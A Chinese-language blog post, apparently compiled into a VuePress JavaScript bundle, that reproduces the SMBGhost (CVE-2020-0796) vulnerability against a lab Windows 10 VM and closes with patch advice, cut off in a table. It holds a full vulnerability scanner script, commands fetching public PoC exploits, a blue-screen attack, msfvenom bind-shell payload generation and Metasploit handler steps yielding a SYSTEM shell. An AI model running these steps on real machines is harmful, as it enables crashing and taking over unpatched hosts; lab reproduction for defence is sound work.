(window.webpackJsonp=window.webpackJsonp||[]).push([[131],{494:function(s,t,a){"use strict";a.r(t);var e=a(11),n=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[s._v("fscan扫描本机，存在永恒之黑漏洞，漏洞复现一下")]),s._v(" "),t("p",[t("strong",[s._v("CVE-2020-0796 SmbGhost Vulnerable")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/1.png",alt:"1"}})]),s._v(" "),t("h2",{attrs:{id:"漏洞原理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞原理"}},[s._v("#")]),s._v(" 漏洞原理")]),s._v(" "),t("p",[s._v("SMB远程代码执行漏洞")]),s._v(" "),t("p",[s._v("Windows 10和Windows Server 2016引入了SMB 3.1.1 ，SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发"),t("strong",[s._v("内存破坏漏洞")]),s._v("，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。")]),s._v(" "),t("p",[s._v("本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。")]),s._v(" "),t("p",{staticStyle:{color:"red"}},[s._v("永恒之黑漏洞也是由smb协议引发的漏洞，永恒之蓝是smb v1版本漏洞，永恒之黑是smb v3版本漏洞")]),s._v(" "),t("h2",{attrs:{id:"影响范围"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#影响范围"}},[s._v("#")]),s._v(" 影响范围")]),s._v(" "),t("p",[s._v("Windows 10 Version 1903 for 32-bit Systems\nWindows 10 Version 1903 for x64-based Systems\nWindows 10 Version 1903 for ARM64-based Systems\nWindows Server, Version 1903 (Server Core installation)\nWindows 10 Version 1909 for 32-bit Systems\nWindows 10 Version 1909 for x64-based Systems\nWindows 10 Version 1909 for ARM64-based Systems\nWindows Server, Version 1909 (Server Core installation)")]),s._v(" "),t("h2",{attrs:{id:"环境"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境"}},[s._v("#")]),s._v(" 环境")]),s._v(" "),t("p",[s._v("靶机：")]),s._v(" "),t("ul",[t("li",[s._v("win10 1909 专业版")]),s._v(" "),t("li",[s._v("IP: 192.168.237.136")])]),s._v(" "),t("p",{staticStyle:{color:"red"}},[s._v("注意需要关闭防火墙，或者说安装火绒接管(x)")]),s._v(" "),t("p",[s._v("攻击机：")]),s._v(" "),t("ul",[t("li",[s._v("kali")]),s._v(" "),t("li",[s._v("IP: 192.168.237.128")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/2.png",alt:"2"}})]),s._v(" "),t("p",[s._v("差点脑子一热打物理主机win10了，准备个虚拟机win10打靶复现，复现两个利用姿势")]),s._v(" "),t("p",[s._v("记得打个快照")]),s._v(" "),t("ul",[t("li",[s._v("蓝屏攻击")]),s._v(" "),t("li",[s._v("RCE")])]),s._v(" "),t("p",[s._v("fscan扫描主机服务挺舒服的，kali没有内置，下载一个，移动到系统变量里")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan\nchmmod +x fscan\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("mv")]),s._v(" fscan /usr/local/bin/\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"利用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用"}},[s._v("#")]),s._v(" 利用")]),s._v(" "),t("p",[s._v("nmap扫描同网段主机")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sS")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.0/24\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("发现靶机")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/3.png",alt:"3"}})]),s._v(" "),t("p",[s._v("nmap探测靶机操作系统类型")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sV")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("windows，以及开启的服务")]),s._v(" "),t("div",{staticClass:"language-plaintext line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plaintext"}},[t("code",[s._v("Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 15:06 CST\nNmap scan report for bogon (192.168.237.136)\nHost is up (0.00015s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\nMAC Address: 00:0C:29:51:8E:30 (VMware)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.11 seconds\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])]),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/4.png",alt:"4"}})]),s._v(" "),t("p",[s._v("nmap扫描靶机可能存在的漏洞")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--script")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("vuln "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("kali用nmap,fscan都扫不到，在靶机里使用fscan可以扫到，玄学问题")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/5.png",alt:"5"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/6.png",alt:"6"}})]),s._v(" "),t("p",[s._v("永恒之黑漏洞扫描脚本：")]),s._v(" "),t("p",[s._v("scan.py")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 项目地址：https://github.com/ollypwn/SMBGhost")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" socket\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" struct\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" sys\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" netaddr "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" IPNetwork\n\npkt "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'\\x00\\x00\\x00\\xc0\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02\"\\x02$\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'")]),s._v("\n\nsubnet "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" sys"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" ip "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" IPNetwork"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("subnet"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n\n    sock "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" socket"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("socket"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("socket"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("AF_INET"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("settimeout"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("connect"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("  "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("445")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("except")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("close"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("continue")]),s._v("\n\n    sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("send"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pkt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    nb"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" struct"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("unpack"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('">I"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    res "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" sock"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("nb"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" res"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("68")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("70")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"\\x11\\x03"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("or")]),s._v(" res"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("70")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("72")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"\\x02\\x00"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string-interpolation"}},[t("span",{pre:!0,attrs:{class:"token string"}},[s._v('f"')]),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v(' Not vulnerable."')])]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string-interpolation"}},[t("span",{pre:!0,attrs:{class:"token string"}},[s._v('f"')]),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v(' Vulnerable"')])]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br")])]),t("p",[s._v("用法：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("python3 scan.py "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("ip"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("扫描，靶机存在可利用漏洞")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/7.png",alt:"7"}})]),s._v(" "),t("h3",{attrs:{id:"蓝屏攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#蓝屏攻击"}},[s._v("#")]),s._v(" 蓝屏攻击")]),s._v(" "),t("p",[s._v("下载蓝屏poc，安装环境")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" bluescreen\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" bluescreen\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://github.com/eerykitty/CVE-2020-0796-PoC/archive/refs/heads/master.zip\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("unzip")]),s._v(" master.zip\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" CVE-2020-0796-PoC-master\npython3 setup.py "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("准备好了，使用poc进行蓝屏攻击靶机")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("./CVE-2020-0796.py "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("蓝屏了，重启好像就没问题了？")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/8.png",alt:"8"}})]),s._v(" "),t("h3",{attrs:{id:"rce获取最高权限"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#rce获取最高权限"}},[s._v("#")]),s._v(" RCE获取最高权限")]),s._v(" "),t("p",[s._v("使用msf生成一个x64 windows正向shell 绑定4444端口的攻击exp")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" windows/x64/meterpreter/bind_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("lport")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" py "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" evil.py\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("下载永恒之黑利用poc")]),s._v(" "),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),t("p",[s._v("利用工具：https://github.com/chompie1337/SMBGhost_RCE_PoC")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" CVE-2020-0796\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" CVE-2020-0796\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://github.com/chompie1337/SMBGhost_RCE_PoC/archive/refs/heads/master.zip\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("unzip")]),s._v(" master.zip\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" SMBGhost_RCE_PoC-master\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("把msf生成的正向shell exp evil.py以及下载利用的poc的exploit.py复制出来，修改比较方便")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/9.png",alt:"9"}})]),s._v(" "),t("p",[s._v("这里是evil.py里的内容")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/10.png",alt:"10"}})]),s._v(" "),t("p",[s._v("这里是exploit.py里的内容")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/11.png",alt:"11"}})]),s._v(" "),t("p",[s._v("需要把evil.py后面的字节数据替换到exploit里的USER_PAYLOAD里")]),s._v(" "),t("p",[s._v("简单的做法，用notepad++或者sublinetext把evil.py里的buf全部替换为USER_PAYLOAD，替换到exploit.py里即可")]),s._v(" "),t("p",[s._v("msf开启监听功能：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfconsole\nuse exploit/multi/handler\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/x64/meterpreter/bind_tcp\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" lport "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhost "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136\nrun\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("这样kali使用msf监听4444端口，本地会向靶机发送数据，测试能否连接靶机的正向shell")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/12.png",alt:"12"}})]),s._v(" "),t("p",[s._v("再开一个终端，执行刚才替换好的exploit.py。kali不能正常连接靶机shell？看看你win10是不是打蓝屏了(x)")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/13.png",alt:"13"}})]),s._v(" "),t("p",[s._v("拿到shell啦！！接收不到shell或者打了两三次了，可以重启下win10靶机")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/14.png",alt:"14"}})]),s._v(" "),t("p",[s._v("拿到最高权限了")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/15.png",alt:"15"}})]),s._v(" "),t("p",[s._v("打完恢复快照，发现硬盘大了32个g，这个靶机里填充了32个g垃圾payload吗")]),s._v(" "),t("h2",{attrs:{id:"修复建议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#修复建议"}},[s._v("#")]),s._v(" 修复建议")]),s._v(" "),t("p",[s._v("官方建议："),t("a",{attrs:{href:"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0796",target:"_blank",rel:"noopener noreferrer"}},[s._v("Windows SMBv3 客户端/服务器远程代码执行漏洞"),t("OutboundLink")],1)]),s._v(" "),t("ul",[t("li",[s._v("安装官方补丁 给对应的系统打微软出的最新补丁")])]),s._v(" "),t("table",[t("thead",[t("tr",[t("th",[s._v("系统类型")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("介绍")]),s._v(" "),t("th",{staticStyle:{"text-align":"center"}},[s._v("下载链接")])])]),s._v(" 